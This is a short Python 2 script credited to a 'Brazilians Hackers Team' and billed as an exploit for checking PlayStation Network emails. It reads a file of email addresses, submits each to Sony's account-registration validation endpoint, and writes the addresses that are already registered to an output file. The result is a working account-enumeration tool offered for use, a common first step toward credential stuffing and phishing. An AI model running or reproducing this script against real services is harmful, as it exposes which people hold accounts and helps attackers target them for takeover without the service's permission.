#!/usr/bin/python
# CodeD By ./ChmoD
# *** Brazilians Hackers Team ***

import urllib2, urllib, sys

print " \n"
print "              ``;`                         "    
print "           `,+@@@+                         "    
print "         .+@@@@@@@;                        "    
print "      `;@@@@@@@@@@@                        "    
print "     +@@@@@@@@@@@@@:                       "    
print "   ;@@@@@@@@@@@@@@@@                       "    
print " `@@@@@@@@@@@@@@@@@@`                      "    
print " `@@@@@@@@@@@@@@@@@@#                      "    
print "  .@@@@@@@@@@@@@@@@@@,                     "    
print "    :@@@@@@@@@@@@@@@@@@      .'@@           "    
print "    #@@@@@@@@@@@@@@@@+;  .+@@@@@            "    
print "     `@@@@@@@@@@@@@#;;+@+#@@@#:`            "    
print "      #@@@@@@@@@@';'@@@@@@@:`               "    
print "      `@@@@@@@+;;+@@@@@##`                  "    
print "       .@@@#;;+@@@@@#+',.,'.                "    
print "       +;;'#@@@@#+;`      ,:                "    
print "        .#@@@@#++:  @.    ...`             "    
print "     `'@@@@#++'. +  .#++;;+  +             "    
print "  ,@@@@@#++:``::+   `',:+,. ,              "    
print " `@@@@#, #+` ',.`'.   +` ``  `,  .+         "    
print "  @@:`  ,+. ,`:``.:   '. .',+++   #           "  
print "  ``    #+`++,.`:,``    :`+@@'@@@@'    ````   "  
print "        #'`#+:`.,`:` .@@@+@#  +`.      :  `:   *** Brazilians Hackers Team *** "
print "        #:: +.`,.., `@@,#@':. +        :   '  "  
print "        #: ` ',:`,, @#``    + +        ' `,;  "  
print "        #: ` `:''`  @` #:.. , '        #+++:           Cod3D By ./ChmoD"  
print "        #: ,     ;#'#  + :   `:         #++   "  
print "        #; '     `''         ,          '.    "  
print "        ;' '                 #         `@#          Skype: BrazilObscure"  
print "        #.;                ;`       ,#.:;     "
print "         `+;               '.        @   `    "  
print "          :#;            `@:        :`  `,   "  
print "           .#+;        `'+.'        +        "    
print "             .@++#'+@+@++` ;@.     '      "      
print "              `' ., ` #:`# `+.#+  :.   "        
print "               ., :  @#;.`;`:  `#@. "            
print "                +``,.;`@+,. '#     "            
print "                @' ' ;`@:+`#`;`    "              
print "               `#+  ,'`#  :.  '    "              
print "               ' #.  :`#` '`. +    "              
print "               # +.  .:+: :`. .    "              
print "              `, +,   ..+ '`   :  "              
print "              ;` #+@:,:#.;``   '  "              
print "              #'##:#+.  : `;   ;  "              
print "              #. #:      `'`   :  "              
print "                 #,        `   . \n"
 
print                      "                  =============================="
print                      "                  =      Checker Email PSN     ="
print                      "                  ==============================\n"


sucesso = 0
falhou = 0
num = 0
try:
    x= len(sys.argv[1])
except:
    print "Modo De Usar: Exploit.py email.txt"
    sys.exit()
with open(sys.argv[1],'r') as emails:
    for line in emails:
        num+=1
        email = line.replace("\n","")
        url="https://account.sonyentertainmentnetwork.com/liquid/reg/account/validate-login-name.action"
        data={'struts.enableJSONValidation':'true',
            'loginName':email,
            'context':'createAccount',
            'isExternal':'$external'}
        data = urllib.urlencode(data)
        req = urllib2.Request(url, data)
        response = urllib2.urlopen(req)
        if "already" not in response.read():
            falhou += 1
            print "%s. Falhou" % num
            pass
        else:
            open("psn.txt",'a').write(email+"\n")
            sucesso += 1
            print "%s. Sucesso" % num
print "====================================="
print "Sucesso: %s" % sucesso
print "Falhou: %s" % falhou
print "Total: %s" % num